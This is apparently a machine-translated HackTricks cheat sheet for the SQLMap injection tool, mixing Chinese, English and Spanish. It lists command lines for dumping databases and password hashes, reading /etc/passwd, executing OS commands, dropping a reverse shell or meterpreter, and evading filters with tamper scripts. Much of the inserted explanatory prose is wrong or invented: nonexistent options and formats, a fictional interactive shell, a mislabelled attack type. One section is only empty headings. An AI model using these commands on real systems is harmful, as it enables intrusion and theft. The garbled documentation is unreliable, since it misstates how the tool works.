# SQLMap - 速查表

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在 HackTricks 中看到你的**公司广告**吗？或者你想获得**PEASS 的最新版本或下载 HackTricks 的 PDF 版本**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家 [**NFTs**](https://opensea.io/collection/the-peass-family) 集合 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向** [**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**

</details>

<figure><img src="../../../.gitbook/assets/image (1) (1) (2) (4).png" alt=""><figcaption></figcaption></figure>

[**DragonJAR Security Conference 是一场国际网络安全活动**](https://www.dragonjarcon.org/)，已经举办了十多年，将于2023年9月7日至8日在哥伦比亚波哥大举行。这是一个内容丰富的技术活动，展示了吸引全球黑客和研究人员的最新研究成果。\
立即在以下链接注册，不要错过这个重要的会议！:

{% embed url="https://www.dragonjarcon.org/" %}

## SQLmap 的基本参数

### 通用参数
```bash
-u "<URL>"
-p "<PARAM TO TEST>"
--user-agent=SQLMAP
--random-agent
--threads=10
--risk=3 #MAX
--level=5 #MAX
--dbms="<KNOWN DB TECH>"
--os="<OS>"
--technique="UB" #Use only techniques UNION and BLIND in that order (default "BEUSTQ")
--batch #Non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--auth-type="<AUTH>" #HTTP authentication type (Basic, Digest, NTLM or PKI)
--auth-cred="<AUTH>" #HTTP authentication credentials (name:password)
--proxy=http://127.0.0.1:8080
--union-char "GsFRts2" #Help sqlmap identify union SQLi techniques with a weird union char
```
### 检索信息

#### 内部
```bash
--current-user #Get current user
--is-dba #Check if current user is Admin
--hostname #Get hostname
--users #Get usernames od DB
--passwords #Get passwords of users in DB
--privileges #Get privileges
```
#### 数据库数据

The `--dump` option can be used to retrieve the data from the database. By default, it will dump all the tables in the database. However, you can specify the tables you want to dump using the `--tables` option.

```bash
sqlmap -u "http://example.com/page.php?id=1" --dump
```

To dump specific tables, use the `--tables` option followed by the table names separated by a comma.

```bash
sqlmap -u "http://example.com/page.php?id=1" --tables users,products
```

You can also use the `--exclude-tables` option to exclude specific tables from being dumped.

```bash
sqlmap -u "http://example.com/page.php?id=1" --tables --exclude-tables logs
```

By default, sqlmap will dump the data in CSV format. However, you can specify a different format using the `--dump-format` option. The supported formats are CSV, HTML, JSON, SQL, and XML.

```bash
sqlmap -u "http://example.com/page.php?id=1" --dump --dump-format=JSON
```

The dumped data will be saved in a file named `dump.csv` (or the specified format) in the current directory.

Note: Dumping data from a database without proper authorization is illegal and unethical. Make sure you have the necessary permissions before performing any database dumps.
```bash
--all #Retrieve everything
--dump #Dump DBMS database table entries
--dbs #Names of the available databases
--tables #Tables of a database ( -D <DB NAME> )
--columns #Columns of a table  ( -D <DB NAME> -T <TABLE NAME> )
-D <DB NAME> -T <TABLE NAME> -C <COLUMN NAME> #Dump column
```
## 注入位置

### 从Burp/ZAP捕获

捕获请求并创建一个req.txt文件
```bash
sqlmap -r req.txt --current-user
```
### GET请求注入

In some cases, the injection can be performed directly in the URL parameters of a GET request. This type of injection is commonly known as GET request injection.

在某些情况下，可以直接在GET请求的URL参数中执行注入。这种类型的注入通常被称为GET请求注入。

To perform a GET request injection, you need to identify the vulnerable parameter in the URL and then use SQLMap to exploit it.

要执行GET请求注入，您需要识别URL中的易受攻击参数，然后使用SQLMap来利用它。

Here is an example of a vulnerable URL:

以下是一个易受攻击的URL示例：

```
http://example.com/page.php?id=1
```

To test if the parameter is vulnerable to injection, you can add a single quote (') at the end of the parameter value:

要测试参数是否容易受到注入攻击，可以在参数值的末尾添加一个单引号（'）：

```
http://example.com/page.php?id=1'
```

If the application is vulnerable, it will likely return an error message indicating a SQL syntax error. This means that the parameter is injectable.

如果应用程序存在漏洞，它很可能会返回一个错误消息，指示SQL语法错误。这意味着参数是可注入的。

To exploit the injection, you can use SQLMap with the `-u` option followed by the vulnerable URL:

要利用注入，可以使用SQLMap，并使用`-u`选项后跟易受攻击的URL：

```
sqlmap -u "http://example.com/page.php?id=1'"
```

SQLMap will automatically detect the injection point and attempt to exploit it by sending various payloads.

SQLMap将自动检测注入点，并尝试通过发送各种有效载荷来利用它。

Remember to always obtain proper authorization before performing any penetration testing activities.
```bash
sqlmap -u "http://example.com/?id=1" -p id
sqlmap -u "http://example.com/?id=*" -p id
```
### POST请求注入

In some cases, the target application may use POST requests to send data to the server. SQL injection can also occur in these cases. To test for SQL injection in a POST request, you can use the `--data` option in SQLMap.

```bash
sqlmap -u "http://example.com/login" --data "username=admin&password=pass" --method POST
```

Here, `--data` is used to specify the POST data, and `--method POST` is used to indicate that the request method is POST.

You can also use the `--data` option with a file that contains the POST data. This can be useful when the POST data is complex or contains special characters.

```bash
sqlmap -u "http://example.com/login" --data "data.txt" --method POST
```

In this case, `data.txt` is a file that contains the POST data.

Remember to properly encode the special characters in the POST data to avoid any issues.

By default, SQLMap will test for SQL injection vulnerabilities in all parameters of the POST request. However, you can specify a specific parameter to test using the `--param` option.

```bash
sqlmap -u "http://example.com/login" --data "username=admin&password=pass" --method POST --param username
```

In this example, only the `username` parameter will be tested for SQL injection.

It is important to note that testing for SQL injection in a POST request may modify the server-side data. Therefore, it is recommended to perform this type of testing on a non-production environment or with proper authorization.
```bash
sqlmap -u "http://example.com" --data "username=*&password=*"
```
### 头部和其他HTTP方法中的注入

In addition to injecting payloads in the URL parameters, SQL injection can also occur in the headers and other HTTP methods. This can be done by manipulating the values of headers such as `User-Agent`, `Referer`, `Cookie`, and `Host`, as well as by exploiting vulnerabilities in other HTTP methods like `POST`, `PUT`, `DELETE`, and `OPTIONS`.

To test for SQL injection in headers, you can use tools like SQLMap. SQLMap is a powerful tool that automates the process of detecting and exploiting SQL injection vulnerabilities. It supports various techniques and features that can be used to identify and exploit SQL injection in different parts of an HTTP request.

To use SQLMap for testing SQL injection in headers, you can specify the target URL and the specific header to test using the `--headers` option. For example:

```
sqlmap -u http://example.com --headers="User-Agent: Mozilla/5.0"
```

This command will send a request to the target URL with the specified `User-Agent` header and check for SQL injection vulnerabilities. SQLMap will automatically analyze the response and attempt to exploit any SQL injection vulnerabilities found.

It is important to note that testing for SQL injection in headers and other HTTP methods should only be done on systems that you have permission to test. Unauthorized testing can be illegal and unethical. Always ensure that you have proper authorization before conducting any security testing.
```bash
#Inside cookie
sqlmap  -u "http://example.com" --cookie "mycookies=*"

#Inside some header
sqlmap -u "http://example.com" --headers="x-forwarded-for:127.0.0.1*"
sqlmap -u "http://example.com" --headers="referer:*"

#PUT Method
sqlmap --method=PUT -u "http://example.com" --headers="referer:*"

#The injection is located at the '*'
```
### 当注入成功时指示字符串

When performing SQL injection attacks, it is important to determine whether the injection was successful or not. One way to do this is by indicating a specific string that will be displayed if the injection is successful.

To achieve this, you can use the `--string` option in SQLMap. This option allows you to specify a string that should be present in the response when the injection is successful.

Here is an example command:

```
sqlmap -u "http://example.com/vulnerable.php?id=1" --string "Injection successful"
```

In this example, SQLMap will send requests to the specified URL with different payloads to test for SQL injection vulnerabilities. If the response contains the string "Injection successful", it means that the injection was successful.

By indicating a specific string, you can automate the process of detecting successful injections and focus on exploiting the vulnerability further.
```bash
--string="string_showed_when_TRUE"
```
### Eval

**Sqlmap**允许使用`-e`或`--eval`在发送每个有效载荷之前使用一些Python一行代码进行处理。这使得在发送有效载荷之前以自定义方式非常容易和快速地处理有效载荷。在下面的示例中，**flask cookie session**在发送之前由flask使用已知的密钥进行签名：
```bash
sqlmap http://1.1.1.1/sqli --eval "from flask_unsign import session as s; session = s.sign({'uid': session}, secret='SecretExfilratedFromTheMachine')" --cookie="session=*" --dump
```
### Shell

#### Introduction

The `shell` command in SQLMap is used to execute a system shell on the target machine. This can be useful for performing various actions, such as uploading or downloading files, executing commands, or even gaining remote access to the target system.

#### Usage

To use the `shell` command, you need to have already exploited a SQL injection vulnerability and obtained a valid session. Once you have a valid session, you can use the following command to open a system shell:

```
sqlmap> shell
```

#### Features

Once you have opened a system shell, you can use various commands to interact with the target machine. Some of the features of the `shell` command include:

- Uploading files: You can use the `upload` command to upload files from your local machine to the target machine.

- Downloading files: You can use the `download` command to download files from the target machine to your local machine.

- Executing commands: You can execute commands on the target machine using the `!` prefix. For example, `!ls` will list the files in the current directory.

- Remote access: With a system shell, you can gain remote access to the target machine and perform actions as if you were physically present on the machine.

#### Example

Here is an example of using the `shell` command to upload a file to the target machine:

```
sqlmap> shell
webshell> upload /path/to/local/file /path/to/remote/file
```

This will upload the file located at `/path/to/local/file` on your local machine to `/path/to/remote/file` on the target machine.

#### Conclusion

The `shell` command in SQLMap is a powerful tool for performing various actions on the target machine. It allows you to interact with the system shell and perform actions such as uploading or downloading files, executing commands, and gaining remote access.
```bash
#Exec command
python sqlmap.py -u "http://example.com/?id=1" -p id --os-cmd whoami

#Simple Shell
python sqlmap.py -u "http://example.com/?id=1" -p id --os-shell

#Dropping a reverse-shell / meterpreter
python sqlmap.py -u "http://example.com/?id=1" -p id --os-pwn
```
### 读取文件

To read files using SQL injection, you can use the `--file-read` option in SQLMap. This option allows you to specify the path of the file you want to read.

使用SQL注入读取文件，可以使用SQLMap中的`--file-read`选项。该选项允许您指定要读取的文件的路径。

```bash
sqlmap -u "http://example.com/vulnerable.php?id=1" --file-read="/etc/passwd"
```

In the above example, we are reading the `/etc/passwd` file from the vulnerable URL `http://example.com/vulnerable.php?id=1`.

在上面的示例中，我们从易受攻击的URL `http://example.com/vulnerable.php?id=1` 中读取了`/etc/passwd`文件。

SQLMap will automatically detect the vulnerability and exploit it to read the specified file. The contents of the file will be displayed in the SQLMap output.

SQLMap将自动检测漏洞并利用它来读取指定的文件。文件的内容将显示在SQLMap的输出中。

It is important to note that reading files using SQL injection can be illegal and unethical if done without proper authorization. Always ensure that you have the necessary permissions and legal rights before attempting any file reading operations.

需要注意的是，如果未经适当授权而进行SQL注入读取文件操作可能是非法和不道德的。在尝试任何文件读取操作之前，始终确保您具有必要的权限和合法权利。
```bash
--file-read=/etc/passwd
```
### 使用SQLmap爬取网站并自动利用漏洞

SQLmap是一款功能强大的自动化SQL注入工具，可以用于爬取网站并自动利用SQL注入漏洞。以下是使用SQLmap进行网站爬取和自动利用的步骤：

1. **爬取网站**
   - 使用`-u`参数指定目标网站的URL，例如：`sqlmap -u http://www.example.com`
   - SQLmap将自动扫描目标网站的参数和表单，并检测是否存在SQL注入漏洞
   - 如果发现漏洞，SQLmap将输出相关信息，并提示是否继续进行自动化利用

2. **自动化利用漏洞**
   - 使用`--dbs`参数获取目标数据库的信息，例如：`sqlmap -u http://www.example.com --dbs`
   - 使用`-D`参数指定要利用的数据库，例如：`sqlmap -u http://www.example.com -D dbname`
   - 使用`--tables`参数获取目标数据库中的表信息，例如：`sqlmap -u http://www.example.com -D dbname --tables`
   - 使用`-T`参数指定要利用的表，例如：`sqlmap -u http://www.example.com -D dbname -T tablename`
   - 使用`--dump`参数获取目标表中的数据，例如：`sqlmap -u http://www.example.com -D dbname -T tablename --dump`

通过按照上述步骤，您可以使用SQLmap自动化地爬取网站并利用SQL注入漏洞。请注意，在进行任何形式的渗透测试之前，确保您已经获得了合法的授权，并遵守适用的法律法规。
```bash
sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3

--batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--crawl = how deep you want to crawl a site
--forms = Parse and test forms
```
### 二次注入

Second Order Injection (also known as Stored Procedure Injection) is a type of SQL injection attack that occurs when user input is stored in a database and later used in a SQL query without proper sanitization. This vulnerability allows an attacker to manipulate the SQL query by injecting malicious input into the stored data.

二次注入（也称为存储过程注入）是一种SQL注入攻击类型，当用户输入被存储在数据库中并在后续的SQL查询中使用时，如果没有进行适当的过滤处理，就会发生这种漏洞。这种漏洞允许攻击者通过向存储的数据中注入恶意输入来操纵SQL查询。

The process of exploiting second order injection involves the following steps:

利用二次注入的过程包括以下步骤：

1. Identifying the vulnerable input: The first step is to identify the user input that is being stored in the database and later used in a SQL query.

1. 识别易受攻击的输入：第一步是识别用户输入，这些输入被存储在数据库中，并在后续的SQL查询中使用。

2. Injecting malicious input: Once the vulnerable input is identified, the attacker can inject malicious input into the stored data. This can be done by manipulating the input in a way that it includes SQL commands or special characters that can alter the behavior of the SQL query.

2. 注入恶意输入：一旦确定了易受攻击的输入，攻击者可以向存储的数据中注入恶意输入。这可以通过以包含SQL命令或特殊字符的方式来操纵输入，从而改变SQL查询的行为。

3. Triggering the injection: The injected input will remain dormant until it is used in a SQL query. The attacker needs to trigger the injection by performing an action that causes the manipulated data to be used in a query.

3. 触发注入：注入的输入将保持休眠状态，直到它在SQL查询中使用。攻击者需要通过执行一个操作来触发注入，这个操作会导致被操纵的数据在查询中被使用。

4. Exploiting the vulnerability: Once the injected input is used in a SQL query, the attacker can exploit the vulnerability to perform various malicious actions, such as extracting sensitive data, modifying the database, or executing arbitrary SQL commands.

4. 利用漏洞：一旦注入的输入在SQL查询中被使用，攻击者可以利用漏洞执行各种恶意操作，例如提取敏感数据、修改数据库或执行任意的SQL命令。

To prevent second order injection attacks, it is important to properly sanitize and validate user input before storing it in the database. Additionally, the use of prepared statements or parameterized queries can help mitigate the risk of SQL injection by separating the SQL code from the user input.

为了防止二次注入攻击，重要的是在将用户输入存储到数据库之前进行适当的过滤和验证。此外，使用预编译语句或参数化查询可以通过将SQL代码与用户输入分离来帮助减轻SQL注入的风险。
```bash
python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
```
[**阅读此文章**](second-order-injection-sqlmap.md)**，了解如何使用sqlmap执行简单和复杂的二次注入。**

<figure><img src="../../../.gitbook/assets/image (1) (1) (2) (4).png" alt=""><figcaption></figcaption></figure>

[**DragonJAR Security Conference是一场国际网络安全活动**](https://www.dragonjarcon.org/)，已经举办了十多年，将于2023年9月7日至8日在哥伦比亚波哥大举行。这是一个内容丰富的技术活动，展示了最新的西班牙语研究成果，吸引了来自世界各地的黑客和研究人员。\
立即在以下链接注册，不要错过这个重要的会议！：

{% embed url="https://www.dragonjarcon.org/" %}

## 自定义注入

### 设置后缀
```bash
python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "
```
### 前缀

---

### Description

描述

---

### Usage

用法

---

### Options

选项

---

### Examples

示例

---

### Remarks

备注

---

### References

参考资料
```bash
python sqlmap.py -u "http://example.com/?id=1"  -p id --prefix="') "
```
### 帮助寻找布尔注入

Boolean-based SQL injection是一种利用布尔逻辑的SQL注入技术。它通过构造SQL查询语句中的布尔表达式来判断注入点是否存在。以下是一些常用的方法来寻找布尔注入：

1. **手动测试**：通过在注入点处插入布尔表达式，观察应用程序的响应是否发生变化。例如，尝试在WHERE子句中使用`AND`、`OR`、`NOT`等逻辑运算符，并观察页面是否显示不同的结果。

2. **错误消息**：观察应用程序返回的错误消息，其中可能包含有关注入点的有用信息。例如，错误消息可能显示SQL查询的语法错误，这可以暗示注入点的存在。

3. **布尔盲注**：如果应用程序没有明显的错误消息，可以使用布尔盲注来判断注入点是否存在。通过构造布尔表达式，根据应用程序的响应来判断条件是否为真或为假。例如，可以使用`AND`、`OR`、`LIKE`等操作符来构造布尔表达式，并根据页面的响应来判断条件是否成立。

4. **时间盲注**：如果应用程序没有明显的错误消息或布尔盲注不起作用，可以尝试使用时间盲注。通过构造SQL查询语句中的延迟操作，观察应用程序的响应时间是否发生变化。例如，可以使用`SLEEP()`函数来引入延迟，并观察页面的响应时间是否增加。

使用工具如SQLMap可以自动化寻找布尔注入漏洞。SQLMap是一款功能强大的自动化SQL注入工具，可以帮助发现和利用布尔注入漏洞。
```bash
# The --not-string "string" will help finding a string that does not appear in True responses (for finding boolean blind injection)
sqlmap -r r.txt -p id --not-string ridiculous --batch
```
### Tamper（篡改）

记住，**你可以自己在Python中创建篡改器**，而且非常简单。你可以在[Second Order Injection页面](second-order-injection-sqlmap.md)中找到一个篡改器的示例。
```bash
--tamper=name_of_the_tamper
#In kali you can see all the tampers in /usr/share/sqlmap/tamper
```
| Tamper                       | 描述                                                                                                                               |
| ---------------------------- | ---------------------------------------------------------------------------------------------------------------------------------- |
| apostrophemask.py            | 将撇号字符替换为其UTF-8全角对应字符                                                                                                 |
| apostrophenullencode.py      | 将撇号字符替换为其非法的双Unicode对应字符                                                                                           |
| appendnullbyte.py            | 在负载末尾附加编码的NULL字节字符                                                                                                   |
| base64encode.py              | 对给定负载中的所有字符进行Base64编码                                                                                               |
| between.py                   | 将大于运算符（'>'）替换为'NOT BETWEEN 0 AND #'                                                                                     |
| bluecoat.py                  | 将SQL语句后的空格字符替换为有效的随机空白字符。然后将字符'='替换为LIKE运算符                                                         |
| chardoubleencode.py          | 对给定负载中的所有字符进行双重URL编码（不处理已编码的字符）                                                                           |
| commalesslimit.py            | 将类似'LIMIT M, N'的实例替换为'LIMIT N OFFSET M'                                                                                    |
| commalessmid.py              | 将类似'MID(A, B, C)'的实例替换为'MID(A FROM B FOR C)'                                                                                |
| concat2concatws.py           | 将类似'CONCAT(A, B)'的实例替换为'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)'                                                                 |
| charencode.py                | 对给定负载中的所有字符进行URL编码（不处理已编码的字符）                                                                               |
| charunicodeencode.py         | 对给定负载中的未编码字符进行Unicode URL编码（不处理已编码的字符）。"%u0022"                                                          |
| charunicodeescape.py         | 对给定负载中的未编码字符进行Unicode URL编码（不处理已编码的字符）。"\u0022"                                                          |
| equaltolike.py               | 将所有等于运算符（'='）替换为LIKE运算符                                                                                             |
| escapequotes.py              | 斜杠转义引号（'和"）                                                                                                               |
| greatest.py                  | 将大于运算符（'>'）替换为'GREATEST'对应字符                                                                                         |
| halfversionedmorekeywords.py | 在每个关键字之前添加带版本的MySQL注释                                                                                               |
| ifnull2ifisnull.py           | 将类似'IFNULL(A, B)'的实例替换为'IF(ISNULL(A), B, A)'                                                                                |
| modsecurityversioned.py      | 使用带版本的注释包围完整查询                                                                                                         |
| modsecurityzeroversioned.py  | 使用零版本的注释包围完整查询                                                                                                         |
| multiplespaces.py            | 在SQL关键字周围添加多个空格                                                                                                         |
| nonrecursivereplacement.py   | 将预定义的SQL关键字替换为适合替换的表示形式（例如.replace("SELECT", ""))过滤器                                                         |
| percentage.py                | 在每个字符前面添加百分号（'%'）                                                                                                     |
| overlongutf8.py              | 转换给定负载中的所有字符（不处理已编码的字符）                                                                                       |
| randomcase.py                | 将每个关键字字符替换为随机大小写值                                                                                                 |
| randomcomments.py            | 向SQL关键字添加随机注释                                                                                                             |
| securesphere.py              | 添加特殊制作的字符串                                                                                                               |
| sp\_password.py              | 在负载末尾附加'sp\_password'以自动混淆DBMS日志                                                                                      |
| space2comment.py             | 将空格字符（' '）替换为注释                                                                                                         |
| space2dash.py                | 将空格字符（' '）替换为破折号注释（'--'），后跟随机字符串和换行符（'\n'）                                                               |
| space2hash.py                | 将空格字符（' '）替换为井号字符（'#'），后跟随机字符串和换行符（'\n'）                                                                 |
| space2morehash.py            | 将空格字符（' '）替换为井号字符（'#'），后跟随机字符串和换行符（'\n'）                                                                 |
| space2mssqlblank.py          | 将空格字符（' '）替换为来自有效备选字符集的随机空白字符                                                                               |
| space2mssqlhash.py           | 将空格字符（' '）替换为井号字符（'#'），后跟换行符（'\n'）                                                                             |
| space2mysqlblank.py          | 将空格字符（' '）替换为来自有效备选字符集的随机空白字符                                                                               |
| space2mysqldash.py           | 将空格字符（' '）替换为破折号注释（'--'），后跟换行符（'\n'）                                                                           |
| space2plus.py                | 将空格字符（' '）替换为加号（'+'）                                                                                                   |
| space2randomblank.py         | 将空格字符（' '）替换为来自有效备选字符集的随机空白字符                                                                               |
| symboliclogical.py           | 将AND和OR逻辑运算符替换为其符号对应字符（&&和\|\|）                                                                                  |
| unionalltounion.py           | 将UNION ALL SELECT替换为UNION SELECT                                                                                                |
| unmagicquotes.py             | 将引号字符（'）替换为多字节组合%bf%27，后跟通用注释（使其起作用）                                                                     |
| uppercase.py                 | 将每个关键字字符替换为大写值'INSERT'                                                                                                |
| varnish.py                   | 添加HTTP头'X-originating-IP'                                                                                                       |
| versionedkeywords.py         | 使用带版本的MySQL注释括起每个非函数关键字                                                                                            |
| versionedmorekeywords.py     | 使用带版本的MySQL注释括起每个关键字                                                                                                |
| xforwardedfor.py             | 添加伪造的HTTP头'X-Forwarded-For'                                                                                                  |

<figure><img src="../../../.gitbook/assets/image (1) (1) (2) (4).png" alt=""><figcaption></figcaption></figure>

[**DragonJAR Security Conference es un evento internacional de ciberseguridad**](https://www.dragonjarcon.org/) con más de una década que se celebrará el 7 y 8 de septiembre de 2023 en Bogotá, Colombia. Es un evento de gran contenido técnico donde se presentan las últimas investigaciones en español que atrae a hackers e investigadores de todo el mundo.\
¡Regístrate ahora en el siguiente enlace y no te pierdas esta gran conferencia!:

{% embed url="https://www.dragonjarcon.org/" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) **或者** [**telegram 群组**](https://t.me/peass) **或者在 Twitter 上关注我** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向** [**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**

</details>
